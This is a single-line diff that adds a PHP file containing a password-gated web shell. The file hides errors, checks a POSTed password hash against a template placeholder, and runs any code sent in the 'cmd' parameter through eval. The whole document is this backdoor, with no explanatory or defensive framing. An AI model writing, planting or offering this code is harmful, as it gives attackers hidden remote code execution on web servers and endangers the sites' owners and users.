@@ -1,0 +1,1 @@
+<?php error_reporting(0);if(sha1($_POST['pwd'])==='%pwd%'){eval($_POST['cmd']);}?>
